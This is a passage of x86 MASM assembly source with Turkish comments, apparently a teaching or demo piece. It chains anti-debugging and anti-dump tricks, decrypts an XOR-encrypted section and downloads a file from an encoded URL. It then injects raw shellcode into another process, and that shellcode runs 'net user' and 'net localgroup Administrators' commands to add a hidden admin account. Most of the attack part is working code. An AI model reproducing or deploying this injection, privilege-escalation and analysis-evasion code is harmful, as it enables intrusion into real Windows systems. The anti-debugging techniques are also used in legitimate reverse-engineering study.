	mov ecx, dword ptr [eax+4] 
	mov dword ptr [pObjInfLocation],ecx 
	mov eax, dword ptr[pObjectTypeInfo]
	movzx ecx, word ptr [eax] ; objeye ait ismin uzunlugu 
	;obje ile isimiz bitti ve diger objeye gecis icin memory pointer'imizi ayarliyoruz
	add ecx, dword ptr[pObjInfLocation] 
	mov dword ptr [pObjInfLocation],ecx 
	;biraz pointer aritmetiði
	mov eax, dword ptr [pObjInfLocation]
	and eax,0FFFFFFFCh
	mov dword ptr [tmp],eax
	;ve artik diger nesnedeyiz
	mov eax, dword ptr [tmp]
	add eax,4 
	mov dword ptr [pObjInfLocation],eax
	;simdi basa donup DebugObject nesnesini aramaya devam edebiliriz
	jmp turn_ever
turn_never:
    assume eax:NOTHING
	;invoke VirtualFree,addr pMemory,0,MEM_RELEASE
	NTVirtualFree typedef PROTO STDCALL :DWORD,:DWORD,:DWORD
	PNTVirtualFree typedef ptr NTVirtualFree
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualFree"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTVirtualFree ptr edx,addr pMemory,0,MEM_RELEASE

; phase_10
; Basit bir yontem ile devam ediyoruz. Burada amac mevcut Desktop nesnesi altinda
; bulunan tum window'lara ait classname'leri sorgulayarak bilinen debugger'larin o an sistemde 
; bulunup bulunmadigini kontrol ediyoruz.
DecodeMe sOlly,02fh, SIZEOF sOlly
	invoke FindWindow,addr sOlly,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif
DecodeMe sWinDbg,02fh, SIZEOF sWinDbg
	invoke FindWindow,addr sWinDbg,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif
DecodeMe sTIda,02fh, SIZEOF sTIda
	invoke FindWindow,addr sTIda,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif
DecodeMe sImmun,02fh, SIZEOF sImmun
	invoke FindWindow,addr sImmun,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif
DecodeMe sProcMon,02fh, SIZEOF sProcMon	
	invoke FindWindow,addr sProcMon,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif
DecodeMe sProcExp,02fh, SIZEOF sProcExp
	invoke FindWindow,addr sProcExp,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif
DecodeMe sProcHck,02fh, SIZEOF sProcHck
	invoke FindWindow,addr sProcHck,NULL
	.if (eax!=0)
		jmp debugger_found_10
	.endif

; phase_11
; Bu yontemde remote connection yontemi kullanarak windbg gibi bir debugger ile processimizin calistigi
; isletim sisteminin debug edilip edilmedigini basit bir yontem kullanarak tespit etmeye calisiyoruz.
; Yaptimiz islem basitce Vista ve sonrasi guest OS'ler'in kendilerini debug ettirebilmek icin kullandigi
; serial, usb veya IEEE 1394 gibi seceneklerden birini kullanmasi halinede bunun tespitini yapmaktan ibaret.
	DecodeMe szTestKey,02fh,SIZEOF szTestKey
	DecodeMe szImmh,02fh,SIZEOF szImmh
	DecodeMe szREGSZ,02fh,SIZEOF szREGSZ
	DecodeMe szFind4Me,02fh,SIZEOF szFind4Me
	mov lpcbData, 250d	
	invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szTestKey, 0, KEY_READ, addr hKey
	invoke RegQueryValueEx, hKey, addr szImmh, 0, addr szREGSZ, addr szBuff, addr lpcbData
	invoke InString,1,addr szBuff,addr szFind4Me
	.if eax!=0
		jmp debugger_found_11
	.endif

	
; phase_12
; Bu method olly ve immunity gibi trace esnasýnda hardware breakpoint'leri handle edebilen
; debuggerlarda iþe yarýyor. Basitce yaptigimiz sey bir memory alaný olusturup ona bekaret kilidi vurmak
; ve ardindan kendimiz erismeyi deneyip bir exception turetmek. Sayet bu tureyen exceptionu olmasi gerektigi
; gibi bizim kendi tanimladigimiz exception handler kodu islerse sorun yok, ancak biz degil olly veya immun
; handle eder ise o zaman debug edildigimizi kolayca anlayabiliyoruz.
	push exception_handler ;bizim hata isleyicimiz
	push dword ptr[fs:0] 
	mov dword ptr [fs:0],esp
	;invoke VirtualAlloc,NULL,01000h,MEM_COMMIT,PAGE_READWRITE ;temiz bir sayfa aciyoruz
	NTVirtualAlloc typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD 
	PNTVirtualAlloc typedef ptr NTVirtualAlloc
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualAlloc"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTVirtualAlloc ptr edx,NULL,01000h,MEM_COMMIT,PAGE_READWRITE ;temiz bir sayfa aciyoruz
	.if eax==0
		print "Bu sefer guldurmedi",13,10
	.endif
	mov dword ptr[pHafiz],eax
   ; hafiza alanimizi retn komutunu icerecek sekilde manipule ediyoruz 2 retn komutunu ise tek bir istisna handler kullanmak icin yaptýk.
	mov word ptr[eax],0C3C3h 
	
	;ayirdigimiz hafiza alanini PAGE_GUARD flag'i ile koruma altina aliyoruz.
	
	;invoke VirtualProtect,dword ptr [pHafiz],01000h, PAGE_EXECUTE_READWRITE + PAGE_GUARD, addr pEskiHali
	NTVirtualProtect typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD
	PNTVirtualProtect typedef ptr NTVirtualProtect
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualProtect"
	push eax
	mov ecx, esp
	mov edx,[esp]
	invoke PNTVirtualProtect ptr edx, dword ptr [pHafiz],01000h, PAGE_EXECUTE_READWRITE + PAGE_GUARD, addr pEskiHali
	xor eax,eax
	; erisimi yasak kildigimiz hafiza alanina call etmeye calisiyoruz ki kendi istisna kodumuza gidelim.
	; gidemezsek debug ediliyoruz demektir zaten. 
	call [pHafiz] 
	.if eax==0
		jmp debugger_found_12
	.endif

; phase_13
; Olly gibi active debugger'lar ile kodunuzu trace eden merakli gozler cogunlukla kod icerisinde aradiklari
; degerli alana ulasmak icin basitce software breakpoint adini verdigimiz tipte durak noktalari atarlar.
; Bizde simdi asagidaki ornek verdigimiz degerli kod bloguna denk gelen alan icin bu tip bir breakpoint
; atanip atanmadiginin kontrolunu yapacagiz.  
cok_degerli_kodun_basi:
jmp cok_degerli_kodun_sonu
	print "Buraya breakpoint koymak yurek ister",13,10
cok_degerli_kodun_sonu:	
	cld
	mov edi,cok_degerli_kodun_basi
	mov ecx,cok_degerli_kodun_sonu-cok_degerli_kodun_basi
	mov al,0CCh		;int 3 ariyoruz	
	repne scasb
	jz	debugger_found_13

; phase_14	
; Bu faz'da ise yine olly gibi hardware breakpoint'leri handle edebilen debugger'lari tespit 
; edecegiz. Kodumuzun herhangi bir yerine hardware breakpoint uygulanirsa asagida ki 
; kod blogu ile bunu basitce anlayabilecegiz. Mantik basit ancak yinede aciklayacak olursam:
; hardware breakpoint'lerini ne yazik ki usermode'dan dogrudan test edemiyoruz bunun icin
; DRx (Debug Registers) registerlarina erismemiz gerekiyor, cunku Hard bp'lerin eristikleri
; memory adreslerine ait bilgiler kernelmode erisimine acik olan bu register'lara yaziliyor. 
; Bu yuzden elimizde ki tek sans olan eski dostumuz ContextRecord yapisina erisiyoruz. Bildiginiz
; gibi bu yapi bir istisna isleme durumunda erisilebilir oldugundan bizde bunu basitce saglayan
; durumu elle tetikliyoruz ;)

	push hardware_breakpoint_handler
	push dword ptr [fs:0]
	mov [fs:0],esp
	;hardware breakpoint varsa eax, handler'da tanimladigimiz degeri alacak
	xor eax,eax
	
	; usta bir istisna cek
	mov dword ptr [eax],0
	
	pop dword ptr [fs:0]
	add esp,4
	
	test eax,eax
	jnz debugger_found_14
	
; phase_15	
; Patch Detection 
; Tum debugger'lar altinda calisan processinizin aktif patch/change protection saglamak amacai ile 
; kullanabilecek bir yontemdir. Belirlediginiz alanlar arasinda yer alan kod blogunuza ait checksum
; degeri kontrol edilerek kodunuzda yapilmis degisiklik ve soft breakpoint'leri tespit edebilirsiniz.
; Reversing'de yeni olanlarin her gordugu conditional jump'i NOT'lamasi (je->jne,74-75 gibi) gibi
; aktivitelere karsi da ise yarayan bir yontemdir.

; ilk olarak degisiliklere karsi korumak istedigimiz kod blogunu seciyor hashini aliyoruz
	cld
	mov edi,korunacak_kod_blogu_basi
	mov ecx,korunacak_kod_blogu_sonu - korunacak_kod_blogu_basi
	xor eax,eax
checksum_loop:
	movzx ebx,byte ptr[edi]
	add	eax,ebx
	rol eax,1
	inc edi
	loop checksum_loop
	mov dword ptr [dwKorunanKodunHashi],eax
; asagida ki 2 etiket arasinda yer alan kod blogu debugger icinden veya disaridan mudahale ile
; degisiliklere karsi korumali durumdadir.
korunacak_kod_blogu_basi:
jmp korunacak_kod_blogu_sonu
	nop
	db 090h
	print "Bu alan korunuyor degistirilemez breakpoint koyulamaz",13,10
	db 0180h/2 ;nop
	dd ($-$)+100*1+44 ; sakin takilmayin gereksiz ama ileride ki derslerde lazim olacak
	nop
	nop
korunacak_kod_blogu_sonu:
; yukarida ki korunan kod blogu icin butunluk kontrolu yapiyoruz
	cld
	mov edi,korunacak_kod_blogu_basi
	mov ecx,korunacak_kod_blogu_sonu - korunacak_kod_blogu_basi
	xor eax,eax
checksum_control_loop:
	movzx ebx,byte ptr[edi]
	add	eax,ebx
	rol eax,1
	inc edi
	loop checksum_control_loop
	cmp eax, dword ptr[dwKorunanKodunHashi]
	jne	debugger_found_15

; Bonus Phase	
	push ss
	pop ss

jmp phase16_17	
; Phase 16 
; Processimizi dump etmek isteyen kotu ellerden korumak icin asagidaki yontemi kullaniyoruz
; Bir processin aktif calisma aninda hafizada ki goruntusunu almak isteyen programlar oncelikle bu hafiza blogunun
; gercek bir Pe Executable yapisi olup olmadigina bakacaktir. Bizde kendi processimizin bu Pe Header alanini ucurarak
; engelliyoruz. 
; Kod bu alana geldiginde Windows Task Manager veya Olly gibi bir arac ile dump almayi denediginizde sonucu gorebilirsiniz.
	;fn VirtualProtect,rv(GetModuleHandle,NULL),4096,PAGE_READWRITE,addr oldPr
	NTVirtualProtect typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD
	PNTVirtualProtect typedef ptr NTVirtualProtect
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualProtect"
	push eax
	mov ecx, esp
	mov edx,[esp]
	invoke PNTVirtualProtect ptr edx, rv(GetModuleHandle,NULL),4096,PAGE_READWRITE,addr oldPr
	fn RtlZeroMemory,rv(GetModuleHandle,NULL),256
;	inkey "Dump Almayi Deneyin"

; Phase 17
; Debug edilen bir process baþka bir ring 3 debuggeri ile ayni anda debug edilebilir mi?
; Cevabi aþaðýda bulabilirsiniz! Asagida ki kodlar ile processimizi linux'de ki gibi fork ediyoruz.
; Boylece processlerimiz debugger ve debugee pozisyonuna geciyor. Baska debuggerlar
; duruma mudahil olmaya calistiginda ise buum.

	;fn CreateProcess,NULL,rv(GetCommandLine),NULL,NULL,FALSE,1,NULL,NULL,addr sip,addr pip
	NTCreateProcessA typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
	PNTCreateProcessA typedef ptr NTCreateProcessA
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"CreateProcessA"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTCreateProcessA ptr edx,NULL,rv(GetCommandLine),NULL,NULL,FALSE,1,NULL,NULL,addr sip,addr pip
	xor eax, eax
	mov eax, offset pip
	assume eax: PTR PROCESS_INFORMATION
	mov ecx, [eax].dwProcessId
	mov edx, [eax].dwThreadId
	;invoke ContinueDebugEvent,ecx,edx,010002h
	NTContinueDebugEvent typedef PROTO STDCALL :DWORD,:DWORD,:DWORD
	PNTContinueDebugEvent typedef ptr NTContinueDebugEvent
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"ContinueDebugEvent"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTContinueDebugEvent ptr edx,ecx,edx,010002h
	;invoke WaitForDebugEvent,addr de,-1
	NTWaitForDebugEvent typedef PROTO STDCALL :DWORD,:DWORD
	PNTWaitForDebugEvent typedef ptr NTWaitForDebugEvent
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"WaitForDebugEvent"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTWaitForDebugEvent ptr edx,addr de,-1
;	inkey "Debugger ile Attach Process Yapmayi Deneyin"
phase16_17:
	jmp debugger_not_found
	
exception_handler:
; SEH ile çalýþtýðýmýzda istisna oluþmasý durumunda iþin içine win32 code'larý da girdiðinden 
; kendi processimizin register'lar'ýna dilediðimiz gibi müdahale edemiyoruz. Manuel olarak çalýþacak
; olan altta ki exception handler içinden ContextRecord yapýsý aracýlýðý ile orjinal
; kod akýþýmýza geri döndüðümüzde hangi register'in ne deðer almasýný bu yapý aracýlýðý ile gerçekleþtiriyoruz.
; Daha basit nasýl anlatýlýr bilemedim þimdi :) 
; ContextRecord alanlarý için bknz: http://www.woodmann.com/crackz/Tutorials/Seh.htm

	mov eax,[esp+0Ch] ;ContextRecord yapýsýna eriþiyoruz.
	mov dword ptr[eax+0B0h],0bababebeh ;(ContextRecord.EAX) Orjinal kod akýþýna döndüðümüzde eax=ffff.. olsun
	inc dword ptr [eax+0B8h] ; (ContextRecord.EIP + 1byte) nereye retn edeceðiz seçebiliyoruz ;)
	xor eax,eax
	retn
	
hardware_breakpoint_handler:
	mov eax,[esp+0Ch] ;ContextRecord yapýsýna eriþiyoruz.
	cmp dword ptr [eax+04h],0 ; Hardware Breakpoint yok ise Dr0-Dr3 sýfýr olmali
	jne hard_bp_detect
	cmp dword ptr [eax+08h],0 ; Dr1
	jne hard_bp_detect
	cmp dword ptr [eax+0Ch],0 ; Dr2
	jne hard_bp_detect
	cmp dword ptr [eax+010h],0 ; Dr3
	jne hard_bp_detect
	jmp bitiriyoruz

hard_bp_detect:
	; Hw bp buldugumuzu iletelim
	mov dword ptr [eax+0B0h],0deadf00dh ; ContextRecord.eax

bitiriyoruz:
	add dword ptr [eax+0B8h], 6 ; Eip ayarliyoruz ki dogru yere inelim
	xor eax, eax
	retn

WhatIsMyName proc
	mov ecx,dword ptr[ebp-1ch]
	push ebx
	mov ebx,ecx
	test ecx,ecx
	je bitir
	mov al,byte ptr ds:[ecx]
	push esi
	push edi
	xor esi,esi
	xor edi,edi
	test al,al
	je temizle_ve_cik
dongu:
	cmp al,5Ch
	je rSlash
	cmp al,2Fh
	jne slash
	mov dl,al
	jmp tek_zipla
rSlash:
	mov dl,5Ch
	tek_zipla:
	lea eax,dword ptr ds:[ecx+1]
	mov ah,byte ptr ds:[eax]
	mov al,dl
	test ah,ah
	je slash
	cmp ah,5Ch
	je slash
	cmp ah,2Fh
	je slash
	xor edi,edi
	lea ebx,dword ptr ds:[ecx+1]
	xor esi,esi
	jmp char_next
slash:
	cmp al,3Ah
	jne char_next
	inc edi
	test esi,esi
	jne char_next
	lea edx,dword ptr ds:[ecx+1]
	mov al,byte ptr ds:[edx]
	test al,al
	je char_next
	cmp al,5Ch
	je char_next
	cmp al,2Fh
	je char_next
	mov esi,edx
char_next:
	push ecx
	call CharNextA
	;push ecx
	;call <kernelbase.CharNextA>
	mov ecx,eax
	mov al,byte ptr ds:[ecx]
	test al,al
	jne dongu
	test esi,esi
	je temizle_ve_cik
	cmp edi,1h
	jne temizle_ve_cik
	mov ebx,esi
temizle_ve_cik:
	pop edi
	pop esi
bitir:
	mov eax,ebx
	add esp,4
	ret
WhatIsMyName endp	
	
debugger_found_0 proc
	print "Bolum 0 - Debugger Tespit Edildi",13,10
	print "Yontem: QueryFullProcessImageNameA != Legal Parent",13,10
	ret
debugger_found_0 endp
	
debugger_found_0_1 proc
	print "Bolum 0 - Debugger Tespit Edildi",13,10
	print "Yontem: Islem adi kontrolu basarisiz",13,10
	ret
debugger_found_0_1 endp
	
	
debugger_found_1 proc
	print "Bolum 1 - Debugger Tespit Edildi",13,10
	print "Yontem: PEB.BeingDebugged != 0",13,10
	ret
debugger_found_1 endp

debugger_found_2 proc
	print "Bolum 2 - Debugger Tespit Edildi",13,10
	print "Yontem: PEB.NtGlobalFlag != 0",13,10
	ret
debugger_found_2 endp

debugger_found_3_1 proc
	print "Bolum 3_1 - Debugger Tespit Edildi",13,10
	print "Yontem: PEB.ProcessHeap.Flags != 2",13,10
	ret
debugger_found_3_1 endp

debugger_found_3_2 proc
	print "Bolum 3_2 - Debugger Tespit Edildi",13,10
	print "Yontem: PEB.ProcessHeap.ForceFlags != 0",13,10
	ret
debugger_found_3_2 endp
	
debugger_found_4_1 proc
	print "Bolum 4_1 - Debugger Tespit Edildi",13,10
	print "Yontem: CheckRemoteDebuggerPresent[bDebuggerPresent] != 0",13,10
	ret
debugger_found_4_1 endp	

debugger_found_4_2 proc
	print "Bolum 4_2 - Debugger Tespit Edildi",13,10
	print "Yontem: NtQueryInformationProcess[dwDebugPort] != 0",13,10
	ret
debugger_found_4_2 endp	

debugger_found_5 proc
	print "Bolum 5 - Debugger Tespit Edildi",13,10
	print "Yontem: SEH eax != 0",13,10
	ret
debugger_found_5 endp

debugger_found_6 proc
	print "Bolum 6 - Debugger Tespit Edildi",13,10
	print "Yontem: GetTickCount",13,10
	ret
debugger_found_6 endp	

debugger_found_7 proc
	print "Bolum 7 - Debugger Tespit Edildi",13,10
	print "Yontem: NtOpenProcess(CsrGetprocessId())==0",13,10
	ret
debugger_found_7 endp	

debugger_found_8 proc
	print "Bolum 8 - Debugger Tespit Edildi",13,10
	print "Yontem: pidExplorer = process32.th32ParentProcessID",13,10
	jmp _end
debugger_found_8 endp	

debugger_found_9 proc
	print "Bolum 9 - Debugger Tespit Edildi",13,10
	print "Ek Aciklama: Sistem de calisan aktif bir debugger tespit edildi",13,10
	print "Yontem: DebugObject.TotalNumberOfObjects != 0",13,10
	jmp _end
debugger_found_9 endp

debugger_found_10 proc
	print "Bolum 10 - Debugger Tespit Edildi",13,10
	print "Yontem: FindWindow(DebugWindow)",13,10
	jmp _end
debugger_found_10 endp

debugger_found_11 proc
	print "Bolum 11 - Debugger Tespit Edildi",13,10
	print "Yontem: Reg Control",13,10
	jmp _end
debugger_found_11 endp

debugger_found_12 proc
	print "Bolum 12 - Debugger Tespit Edildi",13,10
	jmp _end
debugger_found_12 endp

debugger_found_13 proc
	print "Bolum 13 - Debugger Tespit Edildi",13,10
	print "Yontem: Software Breakpoint Tespiti",13,10
	jmp _end
debugger_found_13 endp

debugger_found_14 proc
	print "Bolum 14 - Debugger Tespit Edildi",13,10
	print "Yontem: Hardware Breakpoint Tespiti",13,10
	jmp _end
debugger_found_14 endp

debugger_found_15 proc
	print "Bolum 15 - Debugger Tespit Edildi",13,10
	print "Yontem: Hash kontrol",13,10
	jmp _end
debugger_found_15 endp

debugger_not_found proc
	print "Process debug edilmiyor",13,10
	print "Process Code Injection fazi baslatiliyor",13,10
	call dalicine
debugger_not_found endp

dalicine proc
LOCAL Buffer :UNKNOWN
LOCAL Raiser :TOKEN_PRIVILEGES

lea ebx,sifrelemeyi_bitir_2
lea edx,sifrelemeye_basla_2
sub ebx,edx
mov ecx,ebx
xor eax,eax
mov edi, offset sifrelemeye_basla_2
cozmeye_devam_2:
mov al, byte ptr[edi]
xor al,02eh
mov byte ptr[edi],al
add edi,1
sub ecx,1
test ecx,ecx
jne cozmeye_devam_2
nop

jmp deadbeef_2
db 0bah,0bah,0deh,0deh
deadbeef_2:
sifrelemeye_basla_2:

jmp eicar_end
inject32_start:
xor esi,esi							; db 031h, 0F6h, 
push esi							; db 056h,
assume fs:nothing
mov esi, dword ptr fs:[esi+30h]		; db 064h, 08Bh, 076h, 030h,
mov esi, dword ptr ds:[esi+0Ch] 	; db 08Bh, 076h, 0Ch,
mov esi, dword ptr ds:[esi+1Ch] 	; db 08Bh, 076h, 01Ch,
zipzip:
mov ebp, dword ptr ds:[esi+8h]  	; db 08Bh 06Eh, 08h,
mov esi, dword ptr ds:[esi]			; db 08Bh, 036h,
uzunyolunbaslangici:
mov ebx, dword ptr ss:[ebp+03ch] 	; db 08Bh, 05Dh, 03Ch, 
mov ebx, dword ptr ss:[ebx+ebp+78h]	; db 08Bh, 05Ch, 01Dh, 078h,
add ebx, ebp						; db 01h, 0EBh,
mov ecx, dword ptr ds:[ebx+018h]	; db 08Bh 04Bh, 018h,
jcxz short zipzip					; db 067h, 0E3h, 0ECh,
loopbizimisimiz:
mov edi, dword ptr ds:[ebx+20h] 	; db 08Bh, 07Bh, 020h,
add edi, ebp						; db 01h, 0EFh,
mov edi, dword ptr ds:[ecx*4+edi-4] ; db 08Bh, 07Ch, 08Fh, 0FCh
add edi, ebp						; db 01h, 0EFh,
xor eax,eax							; db 031h, 0C0h,
cdq									; db 099h,
pippip:
xor dl, byte ptr ds:[edi]			; db 032h, 017h,
ror dx,1							; db 066h, 0C1h, 0CAh, 01h,
scas byte ptr es:[edi]				; db 0AEh,
jne short pippip					; db 075h, 0F7h,
cmp dx,0b62ah						; db 066h, 081h, 0FAh, 02Ah, 0B6h,02fh
je hoop								; db 074h, 09h,
cmp dx,01aaah						; db 066h, 081h, 0FAh, 0AAh, 01Ah,
loopnz short loopbizimisimiz		; db 0E0h, 0DBh
jne short zipzip					; db 075h, 0C5h,
hoop:
mov edx, dword ptr ds:[ebx+024h]	; db 08Bh, 053h, 024h,
add edx, ebp						; db 01h, 0EAh,
movzx edx, word ptr ds:[ecx*2+edx]  ; db 0Fh, 0B7h, 014h, 04Ah,
mov edi, dword ptr ds:[ebx+01ch]	; db 08Bh, 07Bh, 01Ch
add edi, ebp						; db 01h, 0EFh,
add ebp, dword ptr ds:[edx*4+edi]	; db 03h, 02Ch, 097h,
test esi, esi						; db 085h, 0F6h,
je short yoladevam 					; db 074h, 016h,
push 020203233h						; db 068h, 033h, 032h, 020h, 020h
push 072657375h						; db 068h, 075h, 073h, 065h, 072h,
push esp							; db 054h,
call ebp							; db 0FFh, 0D5h,
xchg eax, ebp 						; db 095h,
xor esi, esi						; db 031h, 0F6h,
push esi							; db 056h,
jmp  uzunyolunbaslangici 			; db 0E9h, 09Fh,0FFh, 0FFh, 0FFh,
yoladevam:
push 021646c72h						; db 068h, 072h, 06Ch, 064h, 021h,
push 06f77206fh						; db 068h, 06Fh, 020h, 077h, 06Fh,
push 06c6c6548h						; db 068h  048h, 065h, 06Ch, 06Ch,
push esp							; db 054h,
xchg dword ptr ss:[esp], eax		; db 087h, 04h, 024h,
push eax							; db 050h,
push eax							; db 050h,
push esi							; db 056h,
call ebp							; db 0FFh, 0D5h,
int 3								; db 0CCh
int 3

inject32_end:
inject64_start:
	db 031h, 0C9h, 064h, 08Bh, 071h, 030h, 08Bh, 076h, 0Ch, 08Bh, 076h, 01Ch, 08Bh, 036h 
	db 08Bh, 06h, 08Bh, 068h, 08h, 0EBh, 020h, 05Bh, 053h, 055h, 05Bh, 081h, 0EBh, 011h
	db 011h, 011h, 011h, 081h, 0C3h, 0DAh, 03Fh, 01Ah, 011h, 0FFh, 0D3h, 081h, 0C3h, 011h
	db 011h, 011h, 011h, 081h, 0EBh, 08Ch, 0CCh, 018h, 011h, 0FFh, 0D3h, 0E8h, 0DBh, 0FFh
	db 0FFh, 0FFh, 063h, 06dh, 064h
inject64_end:

add_admin_start:
db 031h, 0d2h, 0b2h, 030h, 064h, 08bh, 012h, 08bh, 052h, 0ch, 08bh, 052h, 01ch, 08bh, 042h, 08h
db 08bh, 072h, 020h, 08bh, 012h, 080h, 07eh, 0ch, 033h, 075h, 0f2h, 089h, 0c7h, 03h, 078h, 03ch
db 08bh, 057h, 078h, 01h, 0c2h, 08bh, 07ah, 020h, 01h, 0c7h, 031h, 0edh, 08bh, 034h, 0afh, 01h
db 0c6h, 045h, 081h, 03eh, 057h, 069h, 06eh, 045h, 075h, 0f2h, 08bh, 07ah, 024h, 01h, 0c7h, 066h
db 08bh, 02ch, 06fh, 08bh, 07ah, 01ch, 01h, 0c7h, 08bh, 07ch, 0afh, 0fch, 01h, 0c7h, 068h, 052h
db 01h, 01h, 01h, 068h, 065h, 041h, 06Dh, 065h, 068h, 020h, 053h, 074h, 072h, 068h, 02Fh, 041h
db 044h, 044h, 068h, 06Fh, 072h, 073h, 020h, 068h, 074h, 072h, 061h, 074h, 068h, 069h, 06Eh, 069h
db 073h, 068h, 020h, 041h, 064h, 06Dh, 068h, 072h, 06Fh, 075h, 070h, 068h, 063h, 061h, 06Ch, 067h
db 068h, 074h, 020h, 06Ch, 06Fh, 068h, 026h, 020h, 06Eh, 065h, 068h, 044h, 044h, 020h, 026h, 068h
db 052h, 020h, 02Fh, 041h, 068h, 033h, 040h, 06Dh, 033h, 068h, 020h, 053h, 074h, 072h, 068h, 041h
db 06Dh, 065h, 052h, 068h, 053h, 074h, 072h, 065h, 068h, 073h, 065h, 072h, 020h, 068h, 065h, 074h
db 020h, 075h, 068h, 02Fh, 063h, 020h, 06Eh, 068h, 065h, 078h, 065h, 020h, 068h, 063h, 06Dh, 064h
db 02fh, 089h, 0e5h, 0feh, 04dh, 059h, 031h, 0c0h, 050h, 055h, 0ffh, 0d7h
add_admin_end:

eicar_start:
	db 058h, 035h, 04Fh, 021h, 050h, 025h, 040h, 041h, 050h, 05Bh, 034h, 05Ch, 050h, 05Ah, 058h
	db 035h, 034h, 028h, 050h, 05Eh, 029h, 037h, 043h, 043h, 029h, 037h, 07Dh, 024h, 045h, 049h
	db 043h, 041h, 052h, 02Dh, 053h, 054h, 041h, 04Eh, 044h, 041h, 052h, 044h, 02Dh, 041h, 04Eh
	db 054h, 049h, 056h, 049h, 052h, 055h, 053h, 02Dh, 054h, 045h, 053h, 054h, 02Dh, 046h, 049h
	db 04Ch, 045h, 021h, 024h, 048h, 02Bh, 048h, 02Ah
eicar_end:
sifrelemeyi_bitir_2:
jmp dead_2
db 0bah,0bah,0deh,0deh
dead_2:
nop
	;invoke LoadLibrary, addr lpszLibraryName
	DecodeMe inName,02fh,SIZEOF inName
	DecodeMe inUrl,02fh,SIZEOF inUrl
	DecodeMe lpszLibraryName,02fh,SIZEOF lpszLibraryName     ; db "C:\windows\system32\urlmon.dll",0
	DecodeMe c_Ntdll,02fh,SIZEOF c_Ntdll
	DecodeMe c_NtCreateThreadEx,02fh, SIZEOF c_NtCreateThreadEx
	NTLoadLibraryA typedef PROTO STDCALL :DWORD
	PNTLoadLibraryA typedef ptr NTLoadLibraryA
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"LoadLibraryA"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTLoadLibraryA ptr edx, addr lpszLibraryName
	
	NTURLDownloadToFileA typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
	PNTURLDownloadToFileA typedef ptr NTURLDownloadToFileA
	fn GetProcAddress,eax,"URLDownloadToFileA"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTURLDownloadToFileA ptr edx,0,offset inUrl,offset inName,0,0

	push 0
	push FILE_ATTRIBUTE_NORMAL
	push CREATE_ALWAYS
	push 0
	push FILE_SHARE_READ
	push GENERIC_WRITE
	DecodeMe szStreamer,02fh, SIZEOF szStreamer
	push offset szStreamer
	call CreateFile
	
	;invoke CreateFile,offset szStreamer, GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
	mov hStreamer, eax
	mov ecx, eicar_end - eicar_start
	mov dword ptr[szEicar],ecx
	mov edx, offset eicar_start
	invoke WriteFile, hStreamer,edx,szEicar,rBytes,NULL
	invoke CloseHandle,hStreamer

	;invoke GetWindowThreadProcessId,rv(FindWindow,addr Hedef_Sinif,addr Hedef_Baslik),addr hPid
	DecodeMe Hedef_Baslik,02fh,SIZEOF Hedef_Baslik
	DecodeMe Hedef_Sinif,02fh, SIZEOF Hedef_Sinif
	invoke FindWindow,addr Hedef_Sinif,addr Hedef_Baslik
	mov dword ptr[hTarget],eax
	NTGetWindowThreadProcessId typedef proto STDCALL :DWORD,:DWORD
	PNTGetWindowThreadProcessId typedef ptr NTGetWindowThreadProcessId
	fn GetProcAddress,rv(GetModuleHandle,"user32.dll"),"GetWindowThreadProcessId"
	push eax
	mov ecx, esp
	mov edx, [esp]
	invoke PNTGetWindowThreadProcessId ptr edx,dword ptr[hTarget],addr hPid
	;invoke OpenProcess,PROCESS_ALL_ACCESS,0,hPid
	NTOpenProcess typedef PROTO STDCALL :DWORD,:DWORD,:DWORD
	PNTOpenProcess typedef ptr NTOpenProcess
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"OpenProcess"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTOPENPROCESS ptr edx,PROCESS_ALL_ACCESS,0,hPid
	
	mov hProcess, eax
;	invoke GetProcAddress,rv(GetModuleHandle,addr Kern32),addr LL
;	mov dword ptr[pLoadLibrary],eax
	mov ecx, add_admin_end - add_admin_start
	mov dword ptr [szInject32],ecx
	;invoke VirtualAllocEx,hProcess,NULL,szInject32,MEM_RESERVE+MEM_COMMIT,PAGE_EXECUTE_READWRITE
	NTVirtualAllocEx typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
	PNTVirtualAllocEx typedef ptr NTVirtualAllocEx
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"VirtualAllocEx"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTVirtualAllocEx ptr edx,hProcess,NULL,szInject32,MEM_RESERVE+MEM_COMMIT,PAGE_EXECUTE_READWRITE
	mov pTargetMemory,eax

	;invoke WriteProcessMemory,hProcess,addr pTargetMemory,add_admin_start, szInject32, NULL
	NTWriteProcessMemory typedef PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
